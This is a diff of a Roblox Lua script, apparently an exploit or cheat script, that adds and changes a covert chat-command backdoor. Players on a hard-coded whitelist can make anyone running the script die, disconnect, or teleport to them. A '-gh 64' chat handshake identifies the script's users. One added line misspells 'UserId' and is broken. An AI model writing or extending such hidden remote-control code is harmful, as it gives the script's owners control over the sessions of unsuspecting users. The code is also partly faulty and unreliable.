@@ -7,12 +7,9 @@ for index, asset in pairs(game:GetService("Players"):GetPlayers()) do
   end
 end
 
-game:GetService("Players").PlayerAdded:Connect(function(asset)
-  if whitelistdata[tostring(asset.UserId)] and not whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
-      task.wait(10)
-      game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 64")
-  end
-end)
+if whitelistdata[tostring(game.Players.LocalPlayer.UserId)] then
+  game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 64")
+end
 
 game:GetService("TextChatService").OnIncomingMessage = function(msg)
   if not msg or not msg.TextSource then return end
@@ -23,7 +20,7 @@ game:GetService("TextChatService").OnIncomingMessage = function(msg)
   local props = Instance.new("TextChatMessageProperties")
 
   if Text:lower() == "-gh 64" then
-    if not table.find(possible, Player) then
+    if not whitelistdata[tostring(Player.UserId)] and not table.find(possible, Player) then
     table.insert(possible, Player)
     end
   end
@@ -43,6 +40,10 @@ game:GetService("TextChatService").OnIncomingMessage = function(msg)
         game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
     elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-kick default" then
         game:Shutdown()
+    elseif whitelistdata[tostring(Player.UserId)] and Text:lower() == "-bring default" then
+      game.Players.LocalPlayer.Character.Humanoid.RootPart.CFrame = Player.Character.Humanoid.RootPart.CFrame
+    elseif whitelistdata[tostring(Player.Userid)] and Text:lower() == "-gh 64" then
+      game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 64")
     end
   end
   return props
